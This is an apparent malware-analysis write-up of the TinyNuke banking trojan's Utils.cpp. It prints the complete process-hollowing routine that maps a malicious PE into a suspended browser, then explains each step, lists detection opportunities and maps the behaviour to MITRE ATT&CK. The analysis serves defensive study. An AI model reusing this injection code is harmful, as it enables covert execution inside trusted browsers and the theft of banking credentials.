# TinyNuke - Browser Process Hollowing with Manual PE Mapping

**Repository:** Malware-Collection-master  
**File Path:** TinyNuke/Utils.cpp  
**Language:** C++  
**MITRE ATT&CK:** T1055.012 - Process Injection: Process Hollowing

---

## Overview

TinyNuke implements process hollowing to inject malicious browser code into suspended browser processes. This banking trojan creates legitimate browser processes (Internet Explorer, Firefox, Chrome) in suspended state, manually maps a malicious PE image into their memory space, patches the thread context, and resumes execution. The technique allows TinyNuke to intercept banking traffic under the guise of legitimate browser activity.

---

## Code Snippet 1: Browser Process Creation in Suspended State

```cpp
DWORD RunBrowserProcess(
   const char *browserPath, 
   const char *browserCommandLine, 
   PVOID browser,          // Malicious PE image to inject
   PROCESS_INFORMATION *processInfoParam
)
{
   DWORD                ret           = 0;
   STARTUPINFOA         startupInfo   = { 0 };
   PROCESS_INFORMATION  processInfo   = { 0 };
   
   startupInfo.cb = sizeof(startupInfo);
   
   if(!processInfoParam)
   {
      // Create browser process in suspended mode
      Funcs::pCreateProcessA
      (
         browserPath,                // e.g., "C:\\Program Files\\Internet Explorer\\iexplore.exe"
         browserCommandLine,         // Command line arguments (URL, etc.)
         NULL,                       // Process security attributes
         NULL,                       // Thread security attributes  
         FALSE,                      // Don't inherit handles
         CREATE_SUSPENDED,           // *** SUSPENDED MODE - Key injection flag ***
         NULL,                       // Use parent's environment
         NULL,                       // Use parent's current directory
         &startupInfo, 
         &processInfo
      );
   }
   else
      processInfo = *processInfoParam;
```

**What it does:**  
Creates a legitimate browser process (Internet Explorer, Firefox, Chrome, Opera) in **suspended mode** using `CreateProcessA` with the `CREATE_SUSPENDED` flag. The browser process is created but its main thread is immediately halted before executing any browser code. This provides a window for the attacker to modify the process memory.

**Why it's T1055 (Process Hollowing):**  
The `CREATE_SUSPENDED` flag is the essential first step for process hollowing. By suspending the process immediately upon creation, TinyNuke can manipulate the process memory and thread context before any legitimate code executes. This is a signature indicator of process hollowing attacks.

---

## Code Snippet 2: Remote Memory Allocation for PE Image

```cpp
IMAGE_DOS_HEADER         *dosHeader        = (IMAGE_DOS_HEADER *) browser;
IMAGE_NT_HEADERS         *ntHeaders        = (IMAGE_NT_HEADERS *) (browser + dosHeader->e_lfanew);
IMAGE_SECTION_HEADER     *sectionHeader    = (IMAGE_SECTION_HEADER *) (ntHeaders + 1);
PROCESS_BASIC_INFORMATION processBasicInfo = { 0 };
CONTEXT                   context          = { 0 };
DWORD                     retSize;

context.ContextFlags = CONTEXT_FULL;
if(!Funcs::pGetThreadContext(processInfo.hThread, &context))
   goto exit;

// Allocate memory in remote process for the malicious PE image
// Attempts to allocate at the preferred ImageBase from NT headers
PVOID remoteAddress = Funcs::pVirtualAllocEx
(
   processInfo.hProcess,                           // Handle to browser process
   LPVOID(ntHeaders->OptionalHeader.ImageBase),    // Preferred base address
   ntHeaders->OptionalHeader.SizeOfImage,          // Size of PE image
   0x3000,                                         // MEM_COMMIT | MEM_RESERVE
   PAGE_EXECUTE_READWRITE                          // RWX permissions for code execution
);
```

**What it does:**  
Parses the malicious PE's headers to extract the preferred ImageBase and SizeOfImage. Then allocates memory in the remote browser process using **VirtualAllocEx** at the preferred base address with `PAGE_EXECUTE_READWRITE` permissions. The allocation size matches the malicious PE's total image size.

**Why it's T1055 (Process Hollowing):**  
Remote memory allocation with executable permissions is characteristic of code injection. TinyNuke allocates space for the entire malicious PE image (headers + sections) in the browser process's address space. The RWX permissions allow writing the PE, then executing it—a common pattern in process hollowing.

---

## Code Snippet 3: Writing PE Headers to Remote Process

```cpp
// Write PE headers (DOS header, NT headers, section headers) to remote process
if(!Funcs::pWriteProcessMemory(
   processInfo.hProcess,                           // Target browser process
   remoteAddress,                                  // Allocated memory address
   browser,                                        // Source: malicious PE buffer
   ntHeaders->OptionalHeader.SizeOfHeaders,        // Size: all PE headers
   NULL))                                          // Don't care about bytes written
   goto exit;
```

**What it does:**  
Writes the complete PE headers (DOS header, NT headers, optional header, section headers) from the malicious PE buffer to the allocated memory in the remote browser process using **WriteProcessMemory**. This establishes the PE structure that Windows expects for a valid executable image.

**Why it's T1055 (Process Hollowing):**  
Writing PE headers is essential for manual PE mapping—a common variant of process hollowing. The headers contain critical metadata (entry point, section layout, imports, relocations) that Windows needs to execute the image. This step shows TinyNuke is performing full PE injection, not just shellcode injection.

---

## Code Snippet 4: Section-by-Section PE Mapping

```cpp
// Iterate through all PE sections and write each to the remote process
for(int i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i)
{
   if(!Funcs::pWriteProcessMemory
   (
      processInfo.hProcess,                                           // Target browser process
      LPVOID(DWORD64(remoteAddress) + sectionHeader[i].VirtualAddress),  // Destination: RVA offset
      browser + sectionHeader[i].PointerToRawData,                    // Source: section data
      sectionHeader[i].SizeOfRawData,                                 // Section size
      NULL
   )) goto exit;
}
```

**What it does:**  
Iterates through each PE section (.text, .data, .rdata, .rsrc, .reloc, etc.) and writes it to the correct relative virtual address (RVA) in the remote process. Each section is copied from the malicious PE buffer (`browser + PointerToRawData`) to the remote address space (`remoteAddress + VirtualAddress`).

**Why it's T1055 (Process Hollowing):**  
This manual section mapping is a hallmark of process hollowing. Instead of relying on Windows loader, TinyNuke manually maps each section to reconstruct the PE image in memory. This includes:
- **.text** (executable code)
- **.data** (initialized data)
- **.rdata** (read-only data, imports)
- **.rsrc** (resources)
- **.reloc** (relocations)

By manually mapping sections, TinyNuke bypasses normal loading mechanisms and avoids triggering loader-based detections.

---

## Code Snippet 5: PEB ImageBase Patching

```cpp
// Query the target process to get PEB base address
Funcs::pNtQueryInformationProcess(
   processInfo.hProcess, 
   (LPVOID) 0,              // ProcessBasicInformation class
   &processBasicInfo, 
   sizeof(processBasicInfo), 
   &retSize
);

// Write the new ImageBase to the PEB structure
// PEB.ImageBase is located at PEB + (2 * sizeof(LPVOID))
if(!Funcs::pWriteProcessMemory(
   processInfo.hProcess, 
   LPVOID(DWORD64(processBasicInfo.PebBaseAddress) + sizeof(LPVOID) * 2),  // PEB+16 (64-bit) or PEB+8 (32-bit)
   &remoteAddress,                                                           // New ImageBase value
   sizeof(LPVOID),                                                           // Pointer size
   NULL))
   goto exit;
```

**What it does:**  
Queries the target process's **Process Environment Block (PEB)** base address using `NtQueryInformationProcess`. Then patches the PEB's ImageBase field (at offset `PEB+8` for 32-bit or `PEB+16` for 64-bit) to point to the newly allocated malicious PE image. This ensures the process's internal structures reference the correct base address.

**Why it's T1055 (Process Hollowing):**  
PEB patching is a critical step in advanced process hollowing implementations. The PEB contains essential process metadata including the ImageBase pointer. By updating this pointer, TinyNuke ensures:
- Correct relocation fixups
- Proper TLS (Thread Local Storage) initialization
- Accurate exception handling structures
- Correct module enumeration by debuggers/monitoring tools

This technique demonstrates deep Windows internals knowledge and is commonly seen in sophisticated banking trojans.

---

## Code Snippet 6: Thread Context Redirection

```cpp
// Modify the thread context to redirect execution to the malicious PE entry point
#ifndef _WIN64
   // 32-bit: Set EAX register to entry point
   context.Eax = (DWORD) remoteAddress + ntHeaders->OptionalHeader.AddressOfEntryPoint;
#else
   // 64-bit: Set RCX register to entry point
   context.Rcx = (DWORD64) remoteAddress + ntHeaders->OptionalHeader.AddressOfEntryPoint;
#endif

// Apply the modified context to the suspended thread
if(!Funcs::pSetThreadContext(processInfo.hThread, &context))
   goto exit;
```

**What it does:**  
Modifies the thread context to redirect execution to the malicious PE's entry point. For **32-bit** processes, the EAX register is set to the entry point address. For **64-bit** processes, the RCX register is set (Windows x64 calling convention). The modified context is applied using **SetThreadContext**.

**Why it's T1055 (Process Hollowing):**  
This is the pivotal redirection step. By modifying the entry point register (EAX/RCX), TinyNuke changes where execution will begin when the thread resumes. Instead of executing the legitimate browser code, the thread will jump to the malicious entry point. This context manipulation is a defining characteristic of process hollowing.

**Note on Architecture:**  
The `#ifdef _WIN64` conditional shows TinyNuke supports both 32-bit and 64-bit injection, using:
- **EAX** for 32-bit (stdcall convention, return value/entry point register)
- **RCX** for 64-bit (Microsoft x64 calling convention, first parameter register)

---

## Code Snippet 7: Thread Resumption and Cleanup

```cpp
// Resume the suspended thread to begin executing the malicious code
Funcs::pResumeThread(processInfo.hThread);

// Set return value to the process ID of the injected browser
ret = processInfo.dwProcessId;

exit:
   // Cleanup: close process and thread handles
   Funcs::pCloseHandle(processInfo.hProcess);
   Funcs::pCloseHandle(processInfo.hThread);
   Funcs::pFree(browser);  // Free the malicious PE buffer
   
   return ret;  // Return browser PID (0 on failure)
}
```

**What it does:**  
Calls **ResumeThread** to resume execution of the suspended browser thread, which now has its context redirected to the malicious entry point. Returns the process ID of the injected browser process for tracking. Cleans up handles and frees the PE buffer.

**Why it's T1055 (Process Hollowing):**  
**ResumeThread** is the final step that activates the injection. The suspended browser thread, now redirected to malicious code, begins executing. To any observer, this appears to be a legitimate browser process (correct name, parent process, digital signature on disk), but it's actually running TinyNuke's malicious code. This is the ultimate goal of process hollowing—execution under a trusted identity.

---

## Explanation

**What this code does:**  
TinyNuke implements **process hollowing** to inject malicious code into legitimate browser processes (Internet Explorer, Firefox, Chrome, Opera). The attack sequence:

1. **Create Suspended Browser:** Launches a real browser executable in suspended state using `CreateProcessA` with `CREATE_SUSPENDED`.

2. **Allocate Injection Space:** Allocates memory in the browser process using `VirtualAllocEx` with RWX permissions at the PE's preferred ImageBase.

3. **Manual PE Mapping:** Writes PE headers and all sections to the remote process using `WriteProcessMemory`, manually reconstructing the malicious PE in memory.

4. **Patch PEB ImageBase:** Updates the Process Environment Block's ImageBase pointer to ensure correct internal references for relocations, TLS, and exception handling.

5. **Redirect Thread Context:** Modifies the suspended thread's entry point register (EAX for 32-bit, RCX for 64-bit) using `SetThreadContext` to point to the malicious entry point.

6. **Resume Execution:** Calls `ResumeThread` to begin executing the malicious code within the browser process.

**How it implements T1055 (Process Injection):**  
This is a **classic process hollowing (T1055.012)** implementation specifically targeting browser processes. Unlike the RedLine Stealer example which unmaps the original image, TinyNuke takes a slightly different approach:

- **No Unmapping:** Instead of using `NtUnmapViewOfSection` to hollow the original browser, TinyNuke directly allocates a new memory region at a different base address and maps its PE there. The original browser code remains in memory but is never executed.

- **Manual PE Mapping:** Full manual PE reconstruction (headers + sections) without relying on Windows loader.

- **PEB Patching:** Advanced technique to update internal process structures.

- **Browser-Specific Targeting:** Designed specifically for browser processes to intercept banking/financial traffic.

**Banking Trojan Context:**  
TinyNuke is a banking trojan that emerged around 2016, designed to steal financial credentials by injecting into browser processes. By executing within legitimate browser processes, TinyNuke can:

- **Intercept HTTPS Traffic:** Hook browser crypto APIs to decrypt SSL/TLS before encryption
- **Inject Web Injects:** Modify bank websites to capture credentials, PINs, OTPs
- **Bypass Endpoint Protection:** Browser processes are trusted and whitelisted by security products
- **Evade Network Monitoring:** Traffic appears to originate from legitimate browser processes
- **Persist Across Browser Sessions:** Injected code survives as long as browser runs

**APIs that make it a strong T1055 match:**  
- **CreateProcessA** with `CREATE_SUSPENDED` — Essential for process hollowing
- **VirtualAllocEx** with `PAGE_EXECUTE_READWRITE` — Remote executable memory allocation
- **WriteProcessMemory** — Writing malicious PE to remote process
- **NtQueryInformationProcess** — Querying PEB for patching
- **GetThreadContext** / **SetThreadContext** — Thread hijacking for execution redirection
- **ResumeThread** — Activating the injected code

**Differences from RedLine Stealer's Approach:**  
1. **No Image Unmapping:** TinyNuke doesn't use `NtUnmapViewOfSection` to hollow the original image. Instead, it allocates at a different address.
2. **Browser-Specific:** Targets browser processes specifically (iexplore.exe, firefox.exe, chrome.exe, opera.exe).
3. **Architecture Flexibility:** Explicit support for both 32-bit (EAX) and 64-bit (RCX) injection.
4. **PEB Manipulation:** Manual PEB patching shows advanced Windows internals knowledge.

**Malware Family Resemblance:**  
TinyNuke's process hollowing implementation is similar to other banking trojans:

- **Zeus/Zbot** - Also uses process hollowing into browser processes
- **Dridex** - Browser injection via process hollowing
- **Gozi-ISFB** - Manual PE mapping into browsers
- **TrickBot** - Process hollowing for browser and system process injection
- **Emotet** - Process hollowing into explorer.exe, svchost.exe, browsers

The code quality suggests this is production malware code, not a proof-of-concept. The error handling, architecture support, and PEB patching indicate experienced malware developers.

**Detection Opportunities:**  
- Browser processes (iexplore.exe, firefox.exe, chrome.exe) launched in suspended state
- `VirtualAllocEx` calls from non-debugger processes allocating RWX memory
- `WriteProcessMemory` writing PE signatures (MZ header, "This program cannot be run in DOS mode")
- `SetThreadContext` calls redirecting execution to non-module memory regions
- PEB ImageBase mismatches between expected and actual values
- Browser processes with network connections to non-browser-typical destinations
- Memory regions with executable permissions but no backing file on disk
- Browser child processes spawned by unusual parents (not browser manager processes)

**MITRE ATT&CK Mapping:**  
- **T1055** - Process Injection (Primary)
- **T1055.012** - Process Injection: Process Hollowing (Specific Sub-technique)
- **T1055.002** - Process Injection: Portable Executable Injection (Manual PE mapping)
- **T1185** - Browser Session Hijacking (Ultimate goal after injection)
- **T1056.002** - Input Capture: GUI Input Capture (Keylogging in browser)
- **T1539** - Steal Web Session Cookie (Banking session theft)
- **T1112** - Modify Registry (Persistence for browser injection)
- **T1497.001** - Virtualization/Sandbox Evasion: System Checks (Banking trojans often check for VMs)
